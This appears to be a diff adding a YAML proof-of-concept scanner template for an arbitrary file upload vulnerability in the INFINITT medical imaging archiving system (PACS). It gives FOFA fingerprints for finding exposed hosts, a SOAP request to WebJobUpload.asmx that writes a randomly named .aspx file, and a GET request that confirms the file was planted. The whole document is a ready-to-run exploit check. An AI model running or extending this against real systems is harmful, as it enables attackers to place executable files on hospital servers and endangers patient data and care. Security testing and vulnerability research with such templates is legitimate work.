@@ -1,0 +1,48 @@
+id: poc-yaml-infinitt-webjobupload-anyfile-upload
+info:
+  name: 英飞达医学影像存档与通信系统 WebJobUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 英飞达医学影像存档与通信系统
+  fofa: icon_hash="1474455751" || icon_hash="702238928"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+  t3: base64(t2)
+requests:
+- method: POST
+  path: /webservices/WebJobUpload.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Soapaction: http://rainier/jobUpload
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <jobUpload xmlns="http://rainier">
+
+    <vcode>1</vcode>
+
+    <subFolder></subFolder>
+
+    <fileName>{{.t1}}.aspx</fileName>
+
+    <bufValue>{{.t3}}</bufValue>
+
+    </jobUpload>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \ncontains(body,\"<jobUploadResult>\") &&\ncontains(content_type,\"\
+    text/xml\")\n"
+  output:
+  - regex_match(body,"SystemManager\\\\(?P<file>[0-9]+)\\\\")
+- method: GET
+  path: /{{.file}}/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
